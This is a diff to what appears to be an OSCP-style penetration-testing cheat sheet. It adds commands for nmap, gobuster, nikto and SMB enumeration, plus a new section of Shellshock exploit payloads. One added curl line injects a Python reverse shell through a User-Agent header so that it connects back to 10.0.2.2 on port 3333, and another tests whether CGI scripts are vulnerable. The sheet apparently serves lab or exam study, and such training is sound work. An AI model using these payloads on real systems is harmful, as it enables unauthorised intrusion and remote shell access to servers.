@@ -2,18 +2,30 @@
 
 Network - Nmap
 ```
-$ sudo nmap -v -A [host]  # TCP default ports, OS detection, version detection, script scanning, and traceroute.
-$ sudo nmap -v -p- [host] # TCP all ports.
-$ sudo nmap -v -sU [host] # UDP default ports.
+$ sudo nmap -v -A [target]  # TCP default ports, OS detection, version detection, script scanning, and traceroute.
+$ sudo nmap -v -p- [target] # TCP all ports.
+$ sudo nmap -v -sU [target] # UDP default ports.
 ```
 
 Web - Gobuster
 ```
 $ gobuster dir -u [target] -w ~/OSCP/SecLists/Discovery/Web-Content/[wordlist]
+$ nikto -host [target]
 ```
 
 
 ### FTP [21 TCP]
+
+### Web [80, 8080, 443 TCP]
+
+Apache Shellchock (/cgi-bin/*.cgi])
+```
+# Test if vulnerable
+curl -H "Useragent: () { :; }; echo \"Content-type: text/plain\"; echo; echo; echo 'VULNERABLE'" http://[target]/cgi-bin/[cgi_file]
+
+# Reverse shell
+curl -H "UserAgent: () { :; }; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.2.2\",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" http://localhost:8080/cgi-bin/shellshock_test.sh
+```
 
 
 ### SMB/Samba [139, 445 TCP]
@@ -34,7 +46,7 @@ $ smbclient --no-pass -L //10.11.1.31         # list shares
 $ smbclient --no-pass \\\\[target]\\[share]   # connect to a share
 
 $ smbmap -u "guest" -R [share] -H 10.11.1.31  # recursively list files in a folder
-$ smbget -R smb://[host]/share                # recursively get files from target share/dir
+$ smbget -R smb://[target]/share                # recursively get files from target share/dir
 ```
 
 
